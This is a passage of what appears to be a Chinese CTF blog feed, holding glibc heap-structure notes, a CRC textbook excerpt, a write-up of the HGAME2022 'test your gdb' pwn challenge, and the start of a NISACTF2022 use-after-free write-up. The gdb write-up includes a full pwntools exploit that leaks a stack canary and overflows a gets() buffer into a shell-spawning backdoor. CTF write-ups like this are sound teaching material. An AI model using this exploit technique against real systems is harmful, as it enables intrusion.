class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs c">Each index of an <span class="hljs-built_in">array</span> corresponds to a linked <span class="hljs-title function_">list</span><span class="hljs-params">(LIST)</span><br><br>Only Fast bin use <span class="hljs-title function_">FILO</span><br><span class="hljs-params">(FILO is faster than FIFO)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> INTERNAL_SIZE_T</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> INTERNAL_SIZE_T size_t</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE_SZ (sizeof(INTERNAL_SIZE_T))</span><br><span class="hljs-comment">/* sizeof(size_t) or sizeof(unsigned int) */</span><br><br><span class="hljs-keyword">struct</span> malloc_chunk &#123;<br>INTERNAL_SIZE_T prev_size;<br>INTERNAL_SIZE_T size;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">fd</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">bk</span>;</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">fd_nextsize</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">mbinptr</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> next_bin(b) ((mbinptr)((char *) (b) + (sizeof(mchunkptr) &lt;&lt; 1)))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NBINS 128</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">mfastbinptr</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> &#123;</span><br><span class="hljs-comment">//mutex_t mutex;</span><br>__libc_lock_define(, mutex);<br><br><span class="hljs-type">int</span> flags;<br><br>mfastbinptr fastbinsY[NFASTBINS];<br><br>mchunkptr top;<br>mchunkptr last_remainder;<br>mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> binmap[BINMAPSIZE];<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><br><br>INTERNAL_SIZE_T attached_threads;<br>INTERNAL_SIZE_T system_mem;<br>INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">mstate</span>;</span><br><br>fastbinY[]--&gt;fastbin<br>bins[<span class="hljs-number">0</span>]--&gt;top_chunk(high, program use)<br>bins[<span class="hljs-number">1</span>]--&gt; unsorted bins<br>bins[<span class="hljs-number">2</span>]~bins[<span class="hljs-number">63</span>] --&gt;small bins<br>bins[<span class="hljs-number">64</span>]~bins[<span class="hljs-number">126</span>]--&gt;large bins<br>   <br>top_chunk stores information about the total size of the heap block and is addressed to heap top+<span class="hljs-number">0x8</span><br>    <br>main_arena(a global variable in data segment of libc.so)&lt;--&gt;sbrk<br><span class="hljs-title function_">thread_arena</span><span class="hljs-params">(in the requested heap)</span>&lt;--&gt;mmap<br>For 32 bit system:<br>arena.num_max = <span class="hljs-number">2</span> * core.num<br>For <span class="hljs-number">64</span> bit system:<br>arena.num_max = <span class="hljs-number">8</span> * core.num<br><br><span class="hljs-comment">/* Check if m has acceptable alignment*/</span><br><span class="hljs-comment">/* MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> aligned_OK(m) (((unsigned long) (m) &amp; MALLOC_ALIGN_MASK) == 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> misaligned_chunk(p)                                                    \</span><br><span class="hljs-meta">    ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) &amp;       \</span><br><span class="hljs-meta">     MALLOC_ALIGN_MASK)</span><br><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>); --&gt; <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-keyword">sizeof</span>(prev_size) + <span class="hljs-keyword">sizeof</span>(size) = <span class="hljs-number">0x10</span><br><span class="hljs-keyword">sizeof</span>(fd) = <span class="hljs-number">0x20</span> - <span class="hljs-number">0x10</span> = <span class="hljs-number">0x10</span><br><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x21</span>) --&gt; <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>)<br><span class="hljs-keyword">sizeof</span>(prev_size) + <span class="hljs-keyword">sizeof</span>(size) = <span class="hljs-number">0x10</span><br><span class="hljs-keyword">sizeof</span>(fd) = <span class="hljs-number">0x30</span> - <span class="hljs-number">0x10</span> = <span class="hljs-number">0x20</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> _heap_info &#123;<br>mstate ar_ptr;<span class="hljs-comment">// pointed to the arena for this heap</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span> *<span class="hljs-title">prev</span>;</span><br><span class="hljs-type">size_t</span> size;<br><span class="hljs-type">size_t</span> mprotect_size;<br><span class="hljs-comment">// ensure the heap has been alined</span><br><span class="hljs-type">char</span> pad[<span class="hljs-number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];<br>&#125; heap_info;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">mstate</span>;</span><br><span class="hljs-type">int</span> __malloc_trim(<span class="hljs-type">size_t</span> s) &#123;<br>    <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(!__malloc_initialized)<br>        ptmalloc_init();<br>    mstate ar_ptr = &amp;main_arena;<br>    <span class="hljs-keyword">do</span> &#123;<br>        __libc_lock_lock(ar_ptr-&gt;mutex);<br>        result |= mtrim(ar_ptr, s);<br>        __libc_lock_unlock(ar_ptr-&gt;mutex);<br>        ar_ptr = ar_ptr-&gt;next;<br>    &#125;<span class="hljs-keyword">while</span>(ar_ptr != &amp;main_arena);<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Computer</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
      <tag>pwn</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>循环冗余校验</title>
    <link href="/2023/03/15/%E5%BE%AA%E7%8E%AF%E5%86%97%E4%BD%99%E6%A0%A1%E9%AA%8C/"/>
    <url>/2023/03/15/%E5%BE%AA%E7%8E%AF%E5%86%97%E4%BD%99%E6%A0%A1%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<p>循环冗余码校验（Cyclic Redundancy Check， CRC）是目前在磁表面存储器中应用最广泛的一种校验方法，也是多机网络通信中常用的校验方法。它所约定的校验规则是：让校验码处以某个约定代码，如果余数为0，则表明代码正确，否则利用余数指明出错位。</p><span id="more"></span><p>任意一串数码，很可能除不尽，将产生一个余数。如果让被除数减去余数，势必能为约定除数所除尽。但减法操作需要借位运算，难以用简单的拼装方法实现编码。因此我们采用一种模2运算，即通过模2减来实现模2除，以模2加将所得余数拼接在被除数后面，形成一个能除尽的校验码。当然，在采用模2除后，对除数的选择是有条件的。</p><p>这里所讲的模2运算是一种以按位加减为基础的四则运算，不考虑进位和借位。注意，它与以2为摸得定点小数运算时两个不同的概念。因此，模2加减即按位加减，逻辑上等价于“异或”运算，因此可用异或门实现。</p><p>待编码的信息是一串代码，可能是表示数值大小的数字，也可能是字符编码，或其他性质的代码。在模2除中，暂将它视为数字，可用多项式来描述。我们定义待编信息（被除数）为$M(x)$；约定的除数为$G(x)$，因为它是用来产生余数的，所以$G(x)$又被成为生成多项式，所产生的余数$R(x)$相当于所配的冗余校验位。</p><h2 id="编码方法"><a href="#编码方法" class="headerlink" title="编码方法"></a>编码方法</h2><p>1、将待编码的$k$位有效信息$M(x)$左移$r$位，得$M(x) \cdot x^{r}$。这样做的目的是空出$r$位，以便拼装将来求得的$r$位余数。</p><p>2、选取一个$r+1$位的生成多项式$G(x)$。对$M(x) \cdot x ^ r$作模2除。</p><p>$\frac{M(x)x^r}{G(x)}&#x3D;Q(x)+\frac{R(x)}{G(x)}$模2除</p><p>要产生$r$位余数，所以除数应为$r+1$位。</p><p>3、将左移$r$位的待编码有效信息，与余数$R(x)$模2加，即拼接得到循环校验码。</p><p>$M(x) \cdot x^{r}+R(x)&#x3D;Q(x) \cdot G(x)$模2加</p><p>在按位运算中，“模2加”等价于“异或”运算。$M(x) \cdot x^{r}$的末尾$r$位是0，所以再与余数$R(x)$做“模2加”实际上是将$M(x)$与$R(x)$拼接。拼接成的校验码必定能被约定的$G(x)$除尽。在本节中，将$M(x) \cdot x^{r}+R(x)$称为循环校验码，即CRC码。但在许多磁表面存储器的记录格式中，有时候只将$R(x)$对应的这部分代码称为校验码。</p><p>$\tiny{本段内容选自由中国工信出版集团和电子工业出版社联合出版的《计算机组成原理（第5版）》，侵删}$</p>]]></content>
    
    
    <categories>
      
      <category>Computer</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HGAME2022week1-test your gdb</title>
    <link href="/2023/03/10/HGAME2022week1-test-your-gdb-wp/"/>
    <url>/2023/03/10/HGAME2022week1-test-your-gdb-wp/</url>
    
    <content type="html"><![CDATA[<p>本题为了测试在一种反调试或提高调试难度的机制下选手对于gdb的熟练应用能力。</p><p>本文作者将文件命名为gdbtest。</p><span id="more"></span><p>checksec：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Arch:     amd64-64-little<br>RELRO:    Partial RELRO<br>Stack:    Canary found<br>NX:       NX enabled<br>PIE:      No PIE (0x400000)<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">pthread_t</span> newthread[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br><br>  newthread[<span class="hljs-number">1</span>] = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  pthread_create(newthread, <span class="hljs-number">0LL</span>, work, <span class="hljs-number">0LL</span>);<br>  pthread_join(newthread[<span class="hljs-number">0</span>], <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<span class="hljs-comment">//main</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">work</span><span class="hljs-params">(<span class="hljs-type">void</span> *a1)</span><br>&#123;<br>  <span class="hljs-type">char</span> v2[<span class="hljs-number">256</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-150h] BYREF</span><br>  __int64 v3[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+100h] [rbp-50h] BYREF</span><br>  __int64 s2[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+110h] [rbp-40h] BYREF</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+120h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">char</span> v6[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [rsp+130h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v7; <span class="hljs-comment">// [rsp+148h] [rbp-8h]</span><br><br>  v7 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v3[<span class="hljs-number">0</span>] = <span class="hljs-number">0xBA0033020</span>LL;<br>  v3[<span class="hljs-number">1</span>] = <span class="hljs-number">0xC0000000D00000C</span>LL;<br>  s2[<span class="hljs-number">0</span>] = <span class="hljs-number">0x706050403020100</span>LL;<br>  s2[<span class="hljs-number">1</span>] = <span class="hljs-number">0xF0E0D0C0B0A0908</span>LL;<br>  SEED_KeySchedKey(v2, v3);<br>  SEED_Encrypt(s2, v2);<br>  init_io();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;hopefully you have used checksec&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;enter your pass word&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x10</span>uLL);<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">memcmp</span>(buf, s2, <span class="hljs-number">0x10</span>uLL) )<br>  &#123;<br>    write(<span class="hljs-number">1</span>, v6, <span class="hljs-number">0x100</span>uLL);<br>    gets(v6);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    read(<span class="hljs-number">0</span>, v6, <span class="hljs-number">0x10</span>uLL);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v7;<br>&#125;<span class="hljs-comment">//work</span><br></code></pre></td></tr></table></figure><p><code>pthread_create(newthread, 0LL, work, 0LL);</code>创建了一个调用work函数的线程，该函数会自动调用的线程并执行需要执行的函数，注意，在newthread处有一个数组名对于指针的隐式转换。（注：在C&#x2F;CPP（其他语言暂未研究）中，数组与指针并不同，数组名不是指针。详细内容可自行研究汇编或直接使用在C++11中添加的新特性decltype()和std::is_same_v&lt;, &gt;。）</p><p>在work函数中，其实主要映入眼帘以及亟待解决的是<code>memcmp(buf, s2, 0x10uLL)</code>部分，我们发现s2原本是处于栈空间内的，而前面的key和encrypt加密好像很复杂，直接去解密是相当的不现实，这可怎么比较？有规律还是固定？于是想着调试一下，在exp中写<code>gdb.attach(io)</code>。诶，问题来了，怎么好像就和没有attach到一样？</p><p>于是这种类型便出现了两种调试到memcpy处的方式：</p><p><strong>第一种</strong>，直接使用pwngdb，当使用ni指令逐步调试到pthread_create函数执行完毕之后，pthread_join执行之前，使用<code>i threads</code>指令，发现多了一个线程，这个就是执行work函数的位置，于是我们可以使用<code>thread 2</code>前往create后的线程，然后再使用ni指令，便是work函数的位置了。</p><p>调试到memcpy处：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">► 0x40138b &lt;work+210&gt;    call   memcmp@plt                      &lt;memcmp@plt&gt;<br>       s1: 0x7ffff77c1ec0 ◂— 0xa /* <span class="hljs-string">&#x27;\n&#x27;</span> */<br>       s2: 0x7ffff77c1eb0 ◂— 0xb0361e0e8294f147<br>       n: 0x10<br></code></pre></td></tr></table></figure><p>工具这里其实也有一个隐式类型转换，但已经告诉我们地址了，直接去s2的地址去查就好了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; telescope 0x7ffff77c1eb0<br>00:0000│ rcx rsi 0x7ffff77c1eb0 ◂— 0xb0361e0e8294f147<br>01:0008│         0x7ffff77c1eb8 ◂— 0x8c09e0c34ed8a6a9<br>02:0010│ rax rdi 0x7ffff77c1ec0 ◂— 0xa /* <span class="hljs-string">&#x27;\n&#x27;</span> */<br>03:0018│         0x7ffff77c1ec8 ◂— 0x0<br>... ↓            2 skipped<br>06:0030│         0x7ffff77c1ee0 —▸ 0x7ffff77c2700 ◂— 0x7ffff77c2700<br>07:0038│         0x7ffff77c1ee8 ◂— 0x27a6ad13210ebf00<br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; x/2a 0x7ffff77c1eb0<br>0x7ffff77c1eb0:0xb0361e0e8294f1470x8c09e0c34ed8a6a9<br></code></pre></td></tr></table></figure><p>那么其实memcpy的内容就很明确了，但是由于需要小端法，那么第一次输入其实可以写成：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(<span class="hljs-number">0xb0361e0e8294f147</span>) + p64(<span class="hljs-number">0x8c09e0c34ed8a6a9</span>)<br></code></pre></td></tr></table></figure><p>之后其实就没什么特殊的了，通过占位泄露canary，然后接收，最后再利用gets函数去构造ret2text。</p><p>哦对的，是ret2text，忘上后门地址了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">b4ckd00r</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> execv(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-number">0LL</span>);<br>&#125;<span class="hljs-comment">//b4ckd00r</span><br></code></pre></td></tr></table></figure><p>然后是exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>io = process(<span class="hljs-string">&#x27;./gdbtest&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./gdbtest&#x27;</span>)<br><br><span class="hljs-comment"># gdb.attach(io, &#x27;b *0x401378&#x27;)</span><br><span class="hljs-comment"># pause()</span><br><br>backdoor = <span class="hljs-number">0x401256</span><br>payload = p64(<span class="hljs-number">0xb0361e0e8294f147</span>) + p64(<span class="hljs-number">0x8c09e0c34ed8a6a9</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;word\n&#x27;</span>)<br>io.send(payload)<br>io.recv(<span class="hljs-number">0x18</span>)<br>canary = u64(io.recv(<span class="hljs-number">8</span>))<br>log.success(<span class="hljs-string">&quot;canary: &quot;</span> + (<span class="hljs-built_in">hex</span>(canary)))<br> <br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span> - <span class="hljs-number">0x08</span>) + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(backdoor)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>其实大家可以记一下各种函数都返回什么，例如pxx返回bytes，uxx返回int等等，可能对后续payload的构建更有心得，例如说recv接收多少啊接收什么啊什么的。</p>]]></content>
    
    
    <categories>
      
      <category>CTFPWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>CTF</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NISACTF2022-UAF</title>
    <link href="/2023/03/10/NISACTF2022-UAF-wp/"/>
    <url>/2023/03/10/NISACTF2022-UAF-wp/</url>
    
    <content type="html"><![CDATA[<p>本题我在本机上使用的文件名称为uaf，题目于<a href="https://www.ctfer.vip/problem/2161">NSSCTF</a>。</p><span id="more"></span><p>checksec：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Arch:     i386-32-little<br>RELRO:    Partial RELRO<br>Stack:    Canary found<br>NX:       NX enabled<br>PIE:      No PIE (0x8048000)<br></code></pre></td></tr></table></figure><p>uaf题，本题没有使用到char类型，不考虑canary的影响</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br><br>  v3[<span class="hljs-number">1</span>] = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.create&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2.edit&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3.delete&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4.show&quot;</span>);<br>      <span class="hljs-built_in">putchar</span>(<span class="hljs-number">58</span>);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, v3);<br>      <span class="hljs-keyword">if</span> ( v3[<span class="hljs-number">0</span>] != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      edit();<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v3[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">2</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v3[<span class="hljs-number">0</span>] == <span class="hljs-number">3</span> )<br>      &#123;<br>        del();<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v3[<span class="hljs-number">0</span>] == <span class="hljs-number">4</span> )<br>      &#123;<br>        show();<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>LABEL_13:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid choice&quot;</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v3[<span class="hljs-number">0</span>] != <span class="hljs-number">1</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_13;<br>      create();<br>    &#125;<br>  &#125;<br>&#125;<span class="hljs-comment">//main</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">create</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// eax</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you are creating the %d page\n&quot;</span>, i);<br>  result = i;<br>  <span class="hljs-keyword">if</span> ( i &gt;= <span class="hljs-number">0</span> )<br>  &#123;<br>    result = i;<br>    <span class="hljs-keyword">if</span> ( i &lt;= <span class="hljs-number">9</span> )<br>    &#123;<br>      v1 = i;<br>      (&amp;page)[v1] = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">8u</span>);<br>      <span class="hljs-keyword">if</span> ( i )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( i &lt;= <span class="hljs-number">0</span> || i &gt; <span class="hljs-number">9</span> )<br>        &#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;NO PAGE&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Good cretation!&quot;</span>);<br>          <span class="hljs-keyword">return</span> ++i;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        v2 = page;<br>        *(_DWORD *)page = <span class="hljs-number">1868654951</span>;<br>        v2[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;<br>        *((_DWORD *)page + <span class="hljs-number">1</span>) = echo;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The init page&quot;</span>);<br>        <span 